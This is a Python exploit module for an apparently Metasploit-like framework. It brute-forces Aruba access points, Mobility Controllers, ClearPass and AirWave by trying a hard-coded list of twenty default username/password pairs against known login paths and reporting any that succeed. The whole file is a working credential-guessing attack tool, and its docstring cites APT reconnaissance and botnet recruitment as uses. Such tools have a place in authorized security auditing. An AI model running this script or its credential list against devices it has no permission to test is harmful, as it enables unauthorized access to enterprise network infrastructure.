# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Aruba Networks Default and Common Credentials.

Tests default and well-known credential pairs for Aruba Access Points,
Mobility Controllers, ClearPass Policy Manager, and AirWave.

Default credentials are a frequent initial access vector for:
  - APT reconnaissance (all groups targeting enterprise Wi-Fi)
  - Botnet recruitment of exposed Aruba APs
  - Post-exploitation pivot from WLAN segmentation bypass

Version: 1.0.0
"""

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Aruba Networks Default/Common Credentials Tester.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Aruba Networks Default / Common Credentials",
        "description": (
            "Tests well-known default credentials on Aruba APs, Mobility Controllers, "
            "ClearPass Policy Manager, and AirWave Network Management. "
            "Covers web UI, SSH, SNMP community strings, and API tokens."
        ),
        "authors": ["André Henrique (@mrhenrike)"],
        "references": [
            "https://www.arubanetworks.com/",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-25155",
        ],
        "devices": [
            "Aruba Instant AP (any model)",
            "Aruba Mobility Controller",
            "Aruba Mobility Gateway",
            "Aruba ClearPass Policy Manager",
            "Aruba AirWave Network Management",
        ],
        "severity": "high",
        "cvss": "N/A",
        "cve": "N/A",
        "apt_groups": [],
        "mitre": ["T1078.001"],
    }

    target = OptIP("", "Target Aruba device IP")
    port = OptPort(443, "Management HTTPS port")
    ssl = OptBool(True, "Use SSL/TLS")

    # Default credentials for Aruba devices
    _CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "aruba123"),
        ("admin", "password"),
        ("admin", ""),
        ("admin", "12345678"),
        ("admin", "Aruba#123"),
        ("aruba-admin", ""),
        ("aruba-admin", "admin"),
        ("aruba-admin", "aruba"),
        ("manager", "manager"),
        ("monitor", "monitor"),
        ("operator", "operator"),
        ("guest", "guest"),
        ("readonly", "readonly"),
        # ClearPass specific defaults
        ("appadmin", "eTIPS123"),
        ("appadmin", "admin"),
        ("admin", "eTIPS123"),
        ("cppm", "cppm"),
        # AirWave defaults
        ("admin", "AirWave"),
        ("admin", "amphora"),
    ]

    _LOGIN_PATHS = [
        ("/screens/wms/wms.login", "username", "passwd"),     # Aruba Instant/AOS
        ("/api/login", "username", "password"),               # ArubaOS REST API
        ("/guest/auth_login.php", "username", "password"),   # ClearPass guest
        ("/tips/login", "username", "password"),              # ClearPass mgmt
        ("/login", "username", "password"),                   # AirWave
    ]

    @mute
    def check(self) -> bool:
        """Detect Aruba management interface."""
        try:
            res = self.http_request("GET", f"https://{self.target}:{self.port}/", timeout=6)
            if res:
                body = res.text.lower()
                if any(k in body for k in ["aruba", "instant", "clearpass", "airwave", "arubaos"]):
                    return True
        except Exception:
            pass
        return False

    def run(self) -> None:
        """Test default credentials against detected login endpoints."""
        proto = "https" if self.ssl else "http"
        print_status(f"[ARUBA-CREDS] Targeting {self.target}:{self.port}")
        print_status(f"[ARUBA-CREDS] Testing {len(self._CREDENTIALS)} credential pairs...")

        found_login_path = None

        # Find active login endpoint
        for path, user_field, pass_field in self._LOGIN_PATHS:
            try:
                res = self.http_request("GET", f"{proto}://{self.target}:{self.port}{path}", timeout=6)
                if res and res.status_code in (200, 301, 302):
                    found_login_path = (path, user_field, pass_field)
                    print_info(f"[ARUBA-CREDS] Login endpoint: {path}")
                    break
            except Exception:
                continue

        if not found_login_path:
            print_error("[ARUBA-CREDS] No login endpoint detected. Verify target.")
            return

        path, user_field, pass_field = found_login_path

        for username, password in self._CREDENTIALS:
            try:
                res = self.http_request(
                    "POST",
                    f"{proto}://{self.target}:{self.port}{path}",
                    data={user_field: username, pass_field: password},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=8,
                )
                if res:
                    body_l = res.text.lower()
                    # Check for authenticated response indicators
                    if any(k in body_l for k in [
                        "dashboard", "logout", "welcome", "configuration",
                        "token", "access_token", "session"
                    ]) and "invalid" not in body_l and "incorrect" not in body_l:
                        print_success(f"[ARUBA-CREDS] VALID CREDENTIALS: {username}:{password}")
                        print_success(f"[ARUBA-CREDS] Response snippet: {res.text[:200]}")
                        return
                    # JSON API auth check
                    if res.headers.get("Content-Type", "").startswith("application/json"):
                        try:
                            data = res.json()
                            if data.get("token") or data.get("access_token") or data.get("_global_result", {}).get("status_str") == "Success":
                                print_success(f"[ARUBA-CREDS] VALID CREDENTIALS (API): {username}:{password}")
                                return
                        except Exception:
                            pass
            except Exception:
                continue

        print_info(f"[ARUBA-CREDS] No default credentials found. Device may have been hardened.")
        print_info(f"[ARUBA-CREDS] Tested {len(self._CREDENTIALS)} pairs against {path}")
